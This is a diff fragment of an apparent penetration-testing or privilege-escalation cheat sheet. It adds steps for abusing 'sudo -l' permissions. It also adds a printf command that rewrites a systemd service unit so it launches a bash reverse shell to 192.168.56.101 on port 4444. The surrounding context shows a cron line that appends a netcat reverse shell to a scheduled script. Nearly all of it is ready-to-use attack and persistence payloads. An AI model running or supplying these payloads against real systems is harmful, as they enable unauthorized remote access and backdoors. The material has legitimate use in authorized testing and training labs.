@@ -159,6 +159,25 @@ sudo -u user /bin/bash /var/www/html/start.sh
 ```
 echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
 ```
+### Escalate by checking sudo -l
+```
+sudo -l
+See what commands the user can run
+IF the user can run a file -> go to file location and see if you can edit it to generate a reverse shell
+```
+### Low privilege printf command to overwrite file contents
+```
+https://haxor.no/en/article/systemd-backdoor
+
+printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/setup.sh\n\n[Install]\nWantedBy=multi-user.target"
+Change to
+printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'\n\n[Install]\nWantedBy=multi-user.target" > service.name
+```
+
+
+
+
+
 
 
 ### Backup File
